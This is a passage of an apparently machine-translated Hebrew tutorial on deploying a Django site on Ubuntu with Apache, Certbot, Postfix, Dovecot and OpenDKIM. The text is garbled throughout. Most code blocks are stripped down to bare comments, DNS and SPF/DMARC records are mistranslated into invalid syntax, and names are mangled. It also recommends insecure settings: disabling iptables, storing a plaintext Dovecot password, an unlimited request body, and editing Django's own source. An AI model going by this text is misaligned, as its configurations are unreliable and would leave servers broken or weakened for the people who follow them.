# ההתקנה הושלמה</code></pre>זה הרבה התקנה! בקיצור, קוד זה רושם פקודות, מגדיר את Nano ו- Git, מעתיק מעל קבצים, מוריד ומתקין חבילות Apt של Ubuntu, תלות פייתון, מגדיר את התצורה של Postfix, מגדיר את התצורה של PostgreSQL (שרת מסד הנתונים) ומטען את מסד הנתונים, מגדיר את UFW (חובה לא מסובך), מבטל את ה- iPtables, מוריד אנטי -וירוס, מייצר ספריות, תלות בשיבוטים, מתקין תעודות ומגדיר את השרת, מתקין תצורה, מתחיל ומאפשר את Sect, הקצה החלפת, מגדיר הרשאות ומדפיס את ה- IP, כתובת ה- IPv6 ומפתח OpenDkim. די פשוט, אבל זה נראה כמו הרבה קוד. לא נצטרך הרבה מזה מכיוון שאין לנו את התלות, אנחנו לא משתמשים בסלרי, סלריביט או דפנה, אבל אנו מתקינים חלק מהם בכל מקרה כדי להתחיל. שימו לב שלקוד זה יש תחום המוכרז מספר פעמים.

נצטרך גם לרכוש שם דומיין (שהוא תשלום שנתי קטן). אני ממליץ על Squarespace לרכישת דומיין, הפריסה שלהם היאאינטואיטיבי וקל לשימוש. אתה יכול לקנות כל תחום שתבחר, אבל אני משתמש ב- Domain FemMebabe.com בדוגמה זו. לאחר שקנית דומיין, פנה ללוח התצורה של Squarespace DNS והוסף רשומה מכוונת את הדומיין שלך לשרת לפי כתובת IP. זה אמור להיראות כך:

@ A xx.xx.xx.xx

עם מפעיל @ כמארח, כלומר כל תת -הדומיינים תחת תחום זה ותחום השורש יפנה מחדש לשרת. יש עוד רשומות להצהיר, אך אנו יכולים לעבור לאלה ברגע שאנחנו מוכנים לשלוח דואר. זכור, ייתכן שייקח מספר ימים עד שתוכל לשלוח בהצלחה דואר מהשרת. רשומות ה- DNS שאנו מציבים ייקחו זמן להפיץ.

בכל אופן, התקליט היחיד שאנחנו צריכים להתחיל הוא תקליט. אז עכשיו נוכל למלא את התסריט שלהלן בהתאם לפרויקט שלנו ולהפעיל אותו.

נתחיל עם סקריפט הגדרה קטן יותר כדי להתקין רק את מה שאנחנו צריכים להתקדמות בסיסית. עדיין לא נשתמש בכל כך הרבה תלות או PostgreSQLהעלה שרת HTTP בסיסי ודואג לאישורו בסיום זה. זכור, כדי לקבל תעודת HTTPS ולהפעיל את השרת בצורה מאובטחת, נצטרך לקנות דומיין יחד עם שרת שרת. לעת עתה, החלף את "צוות" בקובץ זה בשם המשתמש שלך, "DIR" עם ספריית הפרויקט שלך, וספק את הדוא"ל והתחום שלך בתגי &lt;&gt;.

בנוסף, לפני שנפעל קוד זה, עלינו לשנות את ההגדרות לחומת האש שספק האירוח תומך בו, אם בכלל. בדרך כלל זה בכרטיסייה 'רשתות' של ספק האירוח שלך, או אם אתה מארח עצמי, זה בקטע 'העברת יציאה' בנתב שלך. תרצה גם להגדיר IP סטטי דרך הנתב שלך עם הכתובת של מכונת השרת שלך, אם אתה משתמש באירוח עצמי. יהיה עליכם לפתוח את היציאות הבאות לגישה לקריאה/כתיבה.

22 (SSH)
25 (דואר)
587 (דואר)
110 (לקוח דואר)
80 (http)
443<pre class="language-bash"><code># !/bin/bash
# פקודות יומן
# NANO CONFIG
# Git Config
# עדכן והתקן
# אפשר אנטי -וירוס Clamav
# הגדר שם מארח
# הגדרת גיבוי מסד נתונים
# השבת iptables
# הגדרת Virtualenv
# התקן את CertBot
# הפעל את CertBot
# הגדר הגדרות משתמש
# הגדר הרשאות
# SUDO CHOWN -R TEAM: משתמשים/var/run/
# שורש Sudo Chown: שורש/ריצה/sudo/ts -r
# טען מחדש ומאפשר שירותים
# אפשר מודולי אפאצ'י
# טען מחדש את הדמון והפעיל מחדש את אפאצ'י, Postfix ו- Opendkim
# הצג את IPv6 ו- OpenDkim לתצורת דומיין</code></pre>לפני הפעלת קוד זה, וודא שהתחום שרכשת מחובר לשרת. לשם כך, פתח מסוף במחשב המקומי שלך והפעל את הפקודה עם הדומיין שלך:<pre class="language-bash"><code>ping femmebabe.com # הכנס את הדומיין שלך כאן, אחרי פינג</code></pre>אם הכל נראה טוב והשרת שולח תגובות, אנו מוכנים להפעיל את הסקריפט ולהתקין חבילות כמו גם להתחיל, לאפשר ולאשר את שרת Apache שלנו.

זה לא כל ההתקנה הדרושה להגדרת התצורה של Postfix, אנו נסתכל על ההתקנה הזו בהמשך. לעת עתה, הפעל את קוד ההתקנה הזה ועליו לקחת מספר דקות להתקנה ולאשר את השרת שלך. שוב, הקפד להחליף שם, דוא"ל ושם דומיין בסקריפט לפי השם שרכשת.

כעת, לאחר שהשרת מועבר, אתה יכול ללכת לכתובת האתר בכל דפדפן אינטרנט ולבדוק כדי לוודא שהשרת מפעיל HTTPS. אם זה לא, נסה לחכות קצת זמן לרשומות ה- DNS להתעדכן ואז הפעל את הפקודה הבאה כדי לנסות מחדש את אישור CertBot:<pre class="language-bash"><code>
sudo certbot --apache --non-interactive --agree-tos --domains &lt;domain&gt;.com --email &lt;youremail&gt;@gmail.com
</code></pre>כל עוד הגדרת את הכל נכון, אתה אמור להיות מסוגל לגשת לדף ברירת המחדל של Apache רק כדי לדעת שהקוד שלך עובד ולהציג דף אינטרנט חי. בשלב הבא, בואו נערוך את ההגדרות. PY כדי לשנות את מצב ברירת המחדל של ברירת המחדל שלנו לייצור. נקבע גם את התצורה של הדומיין בהגדרות, כמו גם IPs פנימיים.<pre class="language-bash"><code>
nano yourproject/settings.py
</code></pre>בהגדרות, שנה/הוסף שורות אלה.<pre class="language-python"><code># תצורת אתר</code></pre>כעת, נצטרך להגדיר את התצורה של Apache2. בואו נערוך את קובץ התצורה שנפרוס בשורה זו:<pre class="language-bash"><code>
sudo nano /etc/apache2/sites-available/femmebabe-le-ssl.conf
</code></pre>קובץ config זה צריך להיות שם הדומיין שלנו, ושם המשתמש והפרויקט. אני משתמש בשם הדומיין FemMebabe.com, בצוות שם המשתמש ובשם הפרויקט FemMebabe.<pre class="language-bash"><code>
ServerSignature Off
ServerTokens Prod
&lt;IfModule mod_ssl.c&gt;
&lt;VirtualHost *:80&gt; 
	Redirect permanent / https://femmebabe.com/
&lt;/VirtualHost&gt;
&lt;VirtualHost *:443&gt;
	ServerName femmebabe.com
	ServerAdmin team@femmebabe.com
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	
	Alias /static /home/team/femmebabe/static
	&lt;Directory /home/team/femmebabe/static&gt;
		Require all granted
	&lt;/Directory&gt;

Alias /media/icons /home/team/femmebabe/media/
&lt;Directory /home/team/femmebabe/media&gt;
Require all granted
&lt;/Directory&gt;

	&lt;Directory /home/team/femmebabe/femmebabe&gt;
		&lt;Files wsgi.py&gt;
			Require all granted
		&lt;/Files&gt;
	&lt;/Directory&gt;

	WSGIScriptAlias / /home/team/femmebabe/femmebabe/wsgi.py
	WSGIDaemonProcess femmebabe python-path=/home/team/femmebabe/ python-home=/home/team/femmebabe/venv header-buffer-size=100000000000 user=team
	WSGIProcessGroup femmebabe
	WSGIApplicationGroup %{GLOBAL}
	
	&lt;Directory /home/team/femmebabe/static&gt;
                Options Indexes FollowSymLinks
                AllowOverride All
	&lt;/Directory&gt;

	&lt;IfModule mod_rewrite.c&gt;
		RewriteEngine on
		RewriteCond %{REQUEST_URI} \.(css|webp|webm|gif|png|mp3|wav|jpeg|jpg|svg|webp)$ [NC]
		RewriteCond %{HTTP_REFERER} !^https://femmebabe.com/media/.*$ [NC]
		RewriteRule ^(.+?)/$ /media/$1 [F,L]
	&lt;/IfModule&gt;

	Include /etc/letsencrypt/options-ssl-apache.conf
	SSLCertificateFile /etc/letsencrypt/live/femmebabe.com/fullchain.pem
	SSLCertificateKeyFile /etc/letsencrypt/live/femmebabe.com/privkey.pem

	Header set X-Frame-Options: "SAMEORIGIN"
	Header set Access-Control-Allow-Origin "https://femmebabe.com"

	TimeOut 60000
	LimitRequestBody 0

	&lt;FilesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|webp|JPG|JPEG|wav|mp3|mp4|public|js|css|swf|webp|svg)$"&gt;
		Header set Cache-Control "max-age=30, public"
	&lt;/FilesMatch&gt;
&lt;/VirtualHost&gt;
&lt;/IfModule&gt;
&lt;IfModule mod_ssl.c&gt;
&lt;VirtualHost *:80&gt;
	ServerName femmebabe.com
	ServerAdmin team@femmebabe.com
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	RewriteEngine on
	RewriteCond %{SERVER_NAME} =femmebabe.com
	RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent]
&lt;/VirtualHost&gt;
&lt;/IfModule&gt;
</code></pre>הקפד להחליף את שם הפרויקט, הספריות והתחום בקוד דוגמה זה בעת קביעת התצורה של השרת שלך. כעת, עלינו להשבית את אתר ברירת המחדל. ניתן לעשות זאת באמצעות Bash.<pre class="language-bash"><code>
sudo a2dissite 000-default-le-ssl
sudo a2dissite 000-default
sudo a2dissite default-ssl
</code></pre>בשלב הבא נוכל לאפשר את אתר ברירת המחדל ולטען מחדש את Apache2, גם באמצעות Bash. זכור להחליף את FemMebabe בשם הקובץ שהצהרת בעת עריכת/etc/apache2/אתרים- Anbail/.<pre class="language-bash"><code>
sudo a2ensite femmebabe-le-ssl
sudo systemctl reload apache2
</code></pre>חזור לדומיין שלך ב- NAVBAR. אתה אמור לראות את האתר שהגדרת בדפדפן האינטרנט שלך. מזל טוב! אם אינך רואה את זה, ייתכן שתצטרך לבצע שינויים מסוימים. עיין בזהירות את ההגדרות בפרויקט שלך, תצורת Apache, וודא שאין לך שגיאות, והפעל את הפקודות הבאות כדי לבדוק שגיאות בפרויקט.<pre class="language-bash"><code>
cd projectname
source venv/bin/activate
python manage.py check
</code></pre>אם יש לך שגיאות בפרויקט Python שלך, עקוב אחריהן למקום בו הם נמצאים ולתקן אותן. יתכן שלא תוכל לראות את כל השגיאות שלך, תלוי היכן הן, כך שאם יש לך שגיאה שפשוט אומרת "אוכלוסייה אינה נוכחת מחדש", ערוך את הקובץ הבא בסביבה הווירטואלית, Registing.Py, כדי לחשוף את שְׁגִיאָה.<pre class="language-bash"><code>
nano venv/lib/python3.12/site-packages/django/apps/registry.py
</code></pre>גלול לשורה 83, שם מוגבה שגיאת זמן ריצה זו (העלה RuntimeError ("אוכלוסייה () אינה מרוכזת מחדש")), והוסיפו תגובה לפני שורה זו, ואז הוספה, עם אותה כניסה, self.app_configs = {}. זה נראה כך:<pre class="language-python"><code>                # מנע שיחות מחדש כדי להימנע מהפעלת AppConfig.ready ()
                # שיטות פעמיים.
# העלאת RuntimeError ("אוכלוסייה () אינה נוכחת מחדש")</code></pre>לאחר מכן תוכל לבדוק שוב את הפרויקט ולחשוף את השגיאה.<pre class="language-bash"><code>
python manage.py check
</code></pre>אז אתה יכול לראות את השגיאה ולתקן אותה. כאשר יש לך אותו קבוע והקוד אוסף ללא שגיאות, הקפד לשנות את הקובץ בחזרה כך שהוא ייראה כך:<pre class="language-python"><code>                # מנע שיחות מחדש כדי להימנע מהפעלת AppConfig.ready ()
                # שיטות פעמיים.
# self.app_configs = {}</code></pre>בתנאי שהשרת מקוון, כאשר אנו מבצעים בו שינויים נוספים, עלינו להשתמש בפקודה הבאה כדי לטעון מחדש את השרת:<pre class="language-bash"><code>
sudo systemctl reload apache2
</code></pre>מדהים! אבל מה לגבי שליחת דואר? כדי להתחיל לשלוח דוא"ל, נצטרך תחילה לעדכן את תצורת הדומיין. זה אמור להיות בפאנל ה- DNS שלך ב- Squarespace, או בכל רשם שם הדומיין שבחרת. נצטרך להתקין ולהוסיף תצורה ולהפעל כמה פקודות. 

ראשית, בואו נקבל את כתובת ה- IPv6 של השרת. לאחר מכן נפתח את ה- DNS שלך ונוסיף את הרשומות.

כדי לקבל את כתובת ה- IPv6 של השרת, השתמש בפקודה זו:<pre class="language-bash"><code>
ip -6 addr
</code></pre>כעת, אנו יכולים להוסיף את הרשומות הבאות להגדרות ה- DNS. הרשומות שלי נראות כך. עם זאת, עבור הרשומות שלך, עליך להחליף את כתובת ה- IP ב- IP שלך (לא 75.147.182.214, זה שלי). הוסף גם את הדומיין שלך במקום FemMebabe.com, כמו גם את כתובת ה- IPv6 שלך שנמצאה עם הפקודה הקודמת (אינך יכול להשתמש בשלי, FE80 :: 725A: FFF: FE49: 3E02). אל תדאג לגבי DomainKey לעת עתה, זה נוצר כאשר אנו מגדירים את Postfix, שרת הדואר, עם OpenDkim, ומדפיס את המפתח. אנו נקבע את התצורה האחרונה.

@
א
N/a
75.147.182.214

@
Mx
10
femmebabe.com

@
Ptr
N/a
femmebabe.com

@
Txt
N/a
Txt @ v = spf1 mx ip75.147.182.214ip6: fe80 :: 725a: fff: fe49: 3e02 ~ הכל

Default._bimi
Txt
N/a
v = bimi1; l = https: //femmebabe.com/media/static/femmebabe.svg

_dmarc
Txt
N/a
v = dmarc1; p = אין

sendonly._domainkey
Txt
N/a<we'll add="" later="" this="">כעת, נצטרך להוסיף תצורה מתמשכת עבור Postfix. כל שעלינו לעשות הוא לוודא שאנו מחליפים את שם הדומיין, femmebabe.com, עם שם הדומיין בו אתה משתמש. בואו נסתכל על כל קבצי התצורה בזה אחר זה, ונתקין אותם בספריה שנקראת Config בפרויקט שלנו, להתקנה למערכת ההפעלה.<pre class="language-bash"><code>
nano config/etc_postfix_main.cf
</code></pre>הוסף טקסט זה לקובץ<pre class="language-bash"><code># ראה /usr/share/postfix/main.cf.dist להגיב, גרסה שלמה יותר
# Debian ספציפי: ציון שם קובץ יגרום לראשונה
# שורה של אותו קובץ שישמש כשם.  ברירת המחדל של דביאן
# IS /etc /שם דואר.
# myorigin = /etc /mailName
# הוספת. דומיין הוא תפקידו של ה- MUA.
# בטל את השורה הבאה כדי ליצור אזהרות "דואר מעוכב"
# DECUREN_WARNING_TIME = 4H
# ראו http://www.postfix.org/compatibility_readme.html - ברירת מחדל ל -3.6
# התקנות טריות.
# פרמטרים של TLS
# תצורת מילטר</code></pre>התצורה הבאה!<pre class="language-bash"><code>
nano config/etc_postfix_master.cf
</code></pre>הוסף את השורות האלה:<pre class="language-bash"><code># 
# קובץ תצורת תהליך Master Postfix.  לפרטים על הפורמט
# של הקובץ, עיין בדף הידני של המאסטר (5) (פקודה: "Man 5 Master" או
# אונליין: http://www.postfix.org/master.5.html).
# 
# אל תשכח לבצע "טעינה מחדש של Postfix" לאחר עריכת קובץ זה.
# 
# ================================================= ========================
# סוג שירות פרטי unpriv chruot chroot Wakeup פקודה maxproc + args
# (כן) (כן) (לא) (לעולם) (100)
# ================================================= ========================
# smtp inet n - y - 1 מסך לאחר
# מעבר SMTPD - - Y - - SMTPD
# dnsblog unix - - y - 0 dnsblog
# tlsproxy unix - - y - 0 tlsproxy
# בחר אחת: הפעל הגשה ללקוחות Loopback בלבד, או עבור כל לקוח.
# 127.0.0.1:SUBSISSISSISSISS
# -o syslog_name = postfix/הגשה
# -o smtpd_tls_security_level = incrypt
# -o smtpd_sasl_auth_enable = כן
# -o smtpd_tls_auth_only = כן
# -o smtpd_reject_unlisted_recipient = לא
# -o smtpd_client_restrictions = $ mua_client_restrictions
# -o smtpd_helo_restrictions = $ mua_helo_restrictions
# -O SMTPD_SENDER_RESTRICTIONS = $ MUA_SENDER_RESTRICTIONS
# -o smtpd_recipient_restrictions =
# -o smtpd_relay_restrictions = permit_sasl_authenticated, דחה
# -o milter_macro_daemon_name = מקור
# בחר אחד: אפשר SMTPs ללקוחות Loopback בלבד, או לכל לקוח.
# 127.0.0.1:smtps inet n - y - - smtpd
# smtps inet n - y - - smtpd
# -o syslog_name = postfix/smtps
# -o smtpd_tls_wrappermode = כן
# -o smtpd_sasl_auth_enable = כן
# -o smtpd_reject_unlisted_recipient = לא
# -o smtpd_client_restrictions = $ mua_client_restrictions
# -o smtpd_helo_restrictions = $ mua_helo_restrictions
# -O SMTPD_SENDER_RESTRICTIONS = $ MUA_SENDER_RESTRICTIONS
# -o smtpd_recipient_restrictions =
# -o smtpd_relay_restrictions = permit_sasl_authenticated, דחה
# -o milter_macro_daemon_name = מקור
# 628 INET N - Y - - QMQPD
# QMGR UNIX N - N 300 1 OQMGR
# -o smtp_helo_timeout = 5 -o smtp_connect_timeout = 5
# 
# ================================================= ===================
# ממשקים לתוכנה שאינה postfix. הקפד לבחון את המדריך
# דפים של תוכנת Non-Postfix כדי לגלות אילו אפשרויות היא רוצה.
# 
# רבים מהשירותים הבאים משתמשים במסירה של צינור Postfix (8)
# סוֹכֵן.  עיין בדף האישה של הצינור (8) למידע על $ {נמען}
# ואפשרויות מעטפת הודעות אחרות.
# ================================================= ===================
# 
# MailDrop. עיין בקובץ Postfix MailDrop_ReadMe לפרטים.
# ציין גם ב- main.cf: maildrop_destination_recipient_limit = 1
# 
# 
# ================================================= ===================
# 
# גרסאות סיירוס אחרונות יכולות להשתמש בכניסה לקיימת "LMTP" הקיים.
# 
# ציין ב- cyrus.conf:
# lmtp cmd = "lmtpd -a" lixe = "localhost: lmtp" proto = tcp4
# 
# ציין ב- Main.cf אחד או יותר מהדברים הבאים:
# mailbox_transport = lmtp: inet: localhost
# Virtual_transport = lmtp: inet: localhost
# 
# ================================================= ===================
# 
# סיירוס 2.1.5 (עמוס גווו)
# ציין גם ב- main.cf: cyrus_destination_recipient_limit = 1
# 
# Cyrus unix - n n - - צינור
# דגלים = drx user = cyrus argv =/cyrus/bin/celipty -e -r $ {שולח} -m $ {הרחבה} $ {user}
# 
# ================================================= ===================
# דוגמה ישנה למסירה באמצעות סיירוס.
# 
# Old -Cyrus Unix - N N - - צינור
# דגלים = r user = cyrus argv =/cyrus/bin/celipty -e -m $ {הרחבה} $ {user}
# 
# ================================================= ===================
# 
# עיין בקובץ PostFix UUCP_README לקבלת פרטי תצורה.
# 
# 
# שיטות משלוח חיצוניות אחרות.
# </code></pre>ותצורת OpenDkim. OpenDkim מזהה שרתי דוא"ל עם מפתחות דומיין כדי להפוך אותם לבטוחים יותר. בלעדיו, הדואר אינו חתום ואולי לא יגיע לתיבת הדואר הנכנס.<pre class="language-bash"><code>
nano config/etc_default_opendkim
</code></pre>הוסף את השורות האלה:<pre class="language-bash"><code># הערה: זהו קובץ תצורה מדור קודם. זה לא משמש על ידי ה- Opendkim
# שירות Systemd. אנא השתמש בפרמטרי התצורה המתאימים ב
# /etc/opendkim.conf במקום.
# 
# בעבר, אפשר היה לערוך את הגדרות ברירת המחדל כאן ואז לבצע
# /lib/opendkim/opendkim.service.generate כדי ליצור קבצי עקיפה של Systemd בכתובת
# /etc/systemd/system/opendkim.service.d/override.conf ו-
# /etc/tmpfiles.d/opendkim.conf. אמנם זה עדיין אפשרי, אבל עכשיו זה
# מומלץ להתאים את ההגדרות ישירות ב- /etc/opendkim.conf.
# 
# Daemon_opts = ""
# שנה ל-/var/spool/postfix/run/opendkim כדי להשתמש בשקע יוניקס עם
# Postfix ב Chroot:
# Rundir =/var/spool/postfix/run/opendkim
# 
# ביטול סימון כדי לציין שקע חלופי
# שים לב שהגדרת זה יעקוף כל ערך שקע ב- OpenDkim.conf
# בְּרִירַת מֶחדָל:
# האזן בכל הממשקים ביציאה 54321:
# SOCKET = INET: 54321
# האזן ב- Loopback ביציאה 12345:
# Socket = INET: 12345@localhost
# האזן בתאריך 192.0.2.1 בנמל 12345:
# Socket = INET: 12345@192.0.2.1</code></pre>
<pre class="language-bash"><code>
nano config/etc_dovecot_conf.d_10-master.conf
</code></pre>הוסף את השורות האלה:<pre class="language-bash"><code># default_process_limit = 100
# default_client_limit = 1000
# מגבלת ברירת מחדל VSZ (גודל זיכרון וירטואלי) לתהליכי שירות. זה בעיקר
# נועד לתפוס ולהרוג תהליכים שמדליפים זיכרון לפני שהם אוכלים
# הַכֹּל.
# default_vsz_limit = 256m
# משתמש הכניסה משמש באופן פנימי על ידי תהליכי כניסה. זה הכי לא אמון
# משתמש במערכת Dovecot. זה לא אמור להיות גישה לשום דבר בכלל.
# default_login_user = dovenull
# המשתמש הפנימי משמש על ידי תהליכים ללא חיבור. זה צריך להיות נפרד מ
# משתמש כניסה, כך שתהליכי כניסה לא יכולים להפריע לתהליכים אחרים.
# default_internal_user = dovecot
    # יציאה = 143
    # יציאה = 993
    # SSL = כן
  # מספר החיבורים לטיפול לפני שמתחילים תהליך חדש. בדרך כלל
  # הערכים השימושיים היחידים הם 0 (ללא הגבלה) או 1. 1 הוא מאובטח יותר, אך 0
  # מהיר יותר. &lt;doc/wiki/loginprocess.txt&gt;
  # Service_Count = 1
  # מספר התהליכים שימשיכו תמיד לחכות לחיבורים נוספים.
  # Process_min_avail = 0
  # אם אתה מגדיר Service_Count = 0, סביר להניח שאתה צריך לגדל את זה.
  # vsz_limit = $ default_vsz_limit
    # יציאה = 110
    # יציאה = 995
    # SSL = כן
    # יציאה = 587
  # צור מאזין INET רק אם אינך יכול להשתמש בשקע UNIX לעיל
  # inet_listener lmtp {
    # הימנע מהפכת LMTP לגלוי לכל האינטרנט
    # כתובת =
    # יציאה =
  # }
  # רוב הזיכרון עובר לקבצי MMAP (). יתכן שתצטרך להגדיל את זה
  # הגבל אם יש לך תיבות דואר ענקיות.
  # vsz_limit = $ default_vsz_limit
  # מקס. מספר תהליכי IMAP (חיבורים)
  # Process_Limit = 1024
  # מקס. מספר תהליכי POP3 (חיבורים)
  # Process_Limit = 1024
  # מקס. מספר תהליכי הגשת SMTP (חיבורים)
  # Process_Limit = 1024
  # Auth_socket_path מצביע על שקע userdb זה כברירת מחדל. זה בדרך כלל
  # משמש על ידי Dovecot-lda, Doveadm, אולי תהליך IMAP וכו '. משתמשים שיש
  # הרשאות מלאות לשקע זה מסוגלות להשיג רשימה של כל שמות המשתמש ו
  # קבל את התוצאות של בדיקות המשתמש של כולם.
  # 
  # מצב ברירת המחדל 0666 מאפשר לכל אחד להתחבר לשקע, אך
  # בדיקות userdb יצליחו רק אם userdb יחזיר שדה "UID"
  # תואם את ה- UID של תהליך המתקשר. גם אם ה- UID או ה- GID של המתקשר תואם את
  # ה- UID של Socket או Gid The Lookup מצליח. כל דבר אחר גורם לכישלון.
  # 
  # כדי לתת למתקשר הרשאות מלאות לחפש את כל המשתמשים, הגדר את המצב ל
  # משהו אחר מ- 0666 ודובקוט מאפשר לגרעין לאכוף את
  # הרשאות (למשל 0777 מאפשרות לכולם הרשאות מלאות).
  # תהליך העובד של Auth מופעל כשורש כברירת מחדל, כך שהוא יכול לגשת אליו
  # /וכו '/צל. אם זה לא הכרחי, יש לשנות את המשתמש ל
  # $ default_internal_user.
  # משתמש = שורש
  # אם משתמשים ב- DICT Proxy, לתהליכי הדואר צריכים להיות גישה לשקע שלו.
  # לדוגמה: מצב = 0660, קבוצה = vmail ו- Global mail_access_groups = vmail
    # מצב = 0600
    # משתמש =
    # קבוצה =</code></pre>שוב, הקפד להחליף את הדומיין בכל הקבצים הללו, FemMebabe.com, עם התחום שבחרת. ערוך את הקובץ הבא, config של dovecot,<pre class="language-bash"><code>
nano config/etc_dovecot_dovecot
</code></pre>ולהוסיף את השורות האלה<pre class="language-bash"><code>## קובץ תצורה של Dovecot
# אם אתה ממהר, ראה http://wiki2.dovecot.org/quickconfiguration
# הפקודה "doveconf -n" נותנת פלט נקי של ההגדרות שהשתנו. השתמש בזה
# במקום להעתיק ולהדביק קבצים בעת פרסום לרשימת התפוצה של Dovecot.
# '# 'דמות והכל אחרי זה מתייחסים אליו כאל הערות. חללים נוספים
# ומתעלמים משרביטים. אם אתה רוצה להשתמש באחד מאותם מפורשות, שים את
# value inside quotes, eg.: key = "# Char and Lawshing Bhartespace "
# ניתן לעקוף את רוב הגדרות (אך לא את כל) על ידי פרוטוקולים שונים ו/או
# IPs מקור/יעד על ידי הצבת ההגדרות בתוך קטעים, למשל:
# פרוטוקול IMAP {}, מקומי 127.0.0.1 {}, שלט 10.0.0.0/8 {}
# ערכי ברירת מחדל מוצגים עבור כל הגדרה, זה לא נדרש לביטול
# הָהֵן. אלה הם יוצאים מן הכלל לכך: אין קטעים (למשל מרחב שמות {})
# או הגדרות התוסף מתווספות כברירת מחדל, הן רשומות רק כדוגמאות.
# נתיבים הם גם דוגמאות רק עם ברירות המחדל האמיתיות מבוססות על תצורה
# אפשרויות. הנתיבים המופיעים כאן מיועדים לתצורה -prefix =/usr
# -sysconfdir =/etc-localstatedir =/var
# הפעל פרוטוקולים מותקנים
# רשימה מופרדת בפסיקים של IP או מארחים היכן להאזין לחיבורים.
# "*" מקשיב בכל ממשקי ה- IPv4, "::" מאזין בכל ממשקי ה- IPv6.
# אם ברצונך לציין יציאות שאינן מפתקות או משהו מורכב יותר,
# ערוך conf.d/master.conf.
# האזנה = *, ::
# ספריית בסיס היכן לאחסן נתוני זמן ריצה.
# base_dir =/var/run/dovecot/
# שם מופע זה. בהגדרה רב-מפגשים DoVeadm ופקודות אחרות
# יכול להשתמש ב- -i &lt;semance_name&gt; כדי לבחור באיזה מופע משתמשים (אלטרנטיבה
# ל- -c &lt;config_path&gt;). שם המופע מתווסף גם לתהליכי dovecot
# בפלט PS.
# despant_name = dovecot
# הודעת ברכה ללקוחות.
# login_greeting = dovecot מוכן.
# רשימה מופרדת בשטח של טווחי רשת מהימנים. חיבורים מאלו
# IPs רשאים לעקוף את כתובות ה- IP והיציאות שלהם (לרישום ו
# לבדיקות אימות). מתעלם גם הוא מתעלם
# רשתות אלה. בדרך כלל היית מציין את שרתי ה- Proxy של ה- IMAP שלך כאן.
# login_trusted_networks =
# רשימה מופרדת בשטח של שטח בדיקת גישה כניסה (למשל TCPWRAP)
# login_access_sockets =
# עם proxy_maybe = כן אם יעד ה- proxy תואם לאף אחד מה- IPs האלה, אל תעשה
# פרוקסיזציה. זה לא הכרחי כרגיל, אך עשוי להיות שימושי אם היעד
# ה- IP הוא למשל IP של איזון עומס.
# Auth_proxy_self =
# הראה יותר כותרות תהליכים מילוליות (ב- PS). כרגע מציג שם משתמש ו
# כתובת IP. שימושי לראות מי משתמש בפועל בתהליכי IMAP
# (למשל תיבות דואר משותפות או אם UID משמשת לחשבונות מרובים).
# Verbose_proctitle = לא
# אם כל התהליכים ייהרגו כאשר תהליך האב של Dovecot נכבה.
# קביעת זה ל- "לא" פירושו שניתן לשדרג את Dovecot בלי
# אילוץ חיבורי לקוחות קיימים לסגירה (אם כי זה יכול להיות גם
# בעיה אם השדרוג הוא למשל בגלל תיקון אבטחה).
# STOWNOWN_CLIENTS = כן
# אם לא אפס, הפעל פקודות דואר באמצעות שרת חיבורים רבים אלה ל- DoVeadm,
# במקום להריץ אותם ישירות באותו תהליך.
# doveadm_worker_count = 0
# שקע או מארח יוניקס: יציאה המשמשת לחיבור לשרת DoVeadm
# doveadm_socket_path = doveadm-server
# רשימה מופרדת בחלל של משתני סביבה שנשמרים ב- Dovecot
# הפעלה ועברה לכל תהליכי הילד שלה. אתה יכול גם לתת
# KEY = זוגות ערך כדי להגדיר תמיד הגדרות ספציפיות.
# import_environment = tz
## 
## הגדרות שרת מילון
## 
# ניתן להשתמש במילון לאחסון רשימות מפתח = ערך. זה משמש כמה
# תוספים. ניתן לגשת למילון באופן ישיר או אם
# שרת מילון. ה- DICT הבא בלוק את שמות מילון
# כאשר משתמשים בשרת. לאחר מכן ניתן להפנות אליהם באמצעות URIS בפורמט
# "פרוקסי :: &lt;שם&gt;".
  # מכסה = mysql: /etc/dovecot/dovecot-dict-sql.conf.ext
# מרבית התצורה בפועל נכללת להלן. שמות הקובץ הם
# לראשונה ממוין לפי ערך ה- ASCII שלהם ומנותח בסדר הזה. ה- 00-PREFIXES
# בשמות קבצים נועדו להקל על הבנת ההזמנה.
# קובץ config יכול גם לנסות להיכלל מבלי לתת שגיאה אם
# זה לא נמצא:
# מאפשר ל- Dovecot להאזין לכל חיבורי הקלט (IPv4 / IPv6)</code></pre>הוסף סיסמה למשתמש Dovecot:<pre class="language-bash"><code>
nano config/etc_dovecot_passwd
</code></pre>החלק הראשון של הקובץ, לפני המעי הגס, הוא שם המשתמש. החלק האחרון, "ה- Passionsword שלך", מציין את הסיסמה שתרצה לתת לשרת הדואר שלך.<pre class="language-bash"><code>
team:{plain}yourpassword
</code></pre>בשלב הבא, תצורת OpenDkim<pre class="language-bash"><code>
nano config/etc_opendkim.conf
</code></pre>ולהוסיף את השורות האלה:<pre class="language-bash"><code># זוהי תצורה בסיסית לחתימה ואימות. זה יכול להיות בקלות
# מותאם להתאים להתקנה בסיסית. ראה OpenDkim.conf (5) ו-
# /usr/share/doc/opendkim/examples/opendkim.conf.sample להשלמה
# תיעוד של פרמטרי תצורה זמינים.
# Logwhy לא
# פרמטרי חתימה ואימות נפוצים. ב- Debian, הכותרת "מ"ה" היא
# הוגן יתר על המידה, מכיוון שלעתים קרובות הוא מפתח הזהות המשמש את מערכות המוניטין
# ובכך מעט רגיש לאבטחה.
# חתימה על תחום, בורר ומפתח (חובה). לדוגמה, בצע חתימה
# לדומיין "דוגמה.com" עם בורר "2020" (2020._domainkey.example.com),
# באמצעות המפתח הפרטי המאוחסן ב /etc/dkimkeys/example.private. גרגירי יותר
# אפשרויות הגדרה ניתן למצוא ב/usr/share/doc/opendkim/readme.opendkim.
# DOMAIN דוגמה.com
# בורר 2020
# Keyfile /etc/dkimkeys/example.private
# ב- Debian, Opendkim פועל כמשתמש "Opendkim". נדרש umask של 007 כאשר
# באמצעות שקע מקומי עם MTAs ניגשים לשקע כל
# משתמש (לדוגמא, Postfix). יתכן שתצטרך להוסיף "PostFix" של המשתמש לקבוצה
# "אופנדקים" במקרה זה.
# שקע לחיבור MTA (חובה). אם ה- MTA נמצא בתוך כלא Chroot,
# יש להבטיח כי השקע נגיש. בביאן, Postfix פועל פנימה
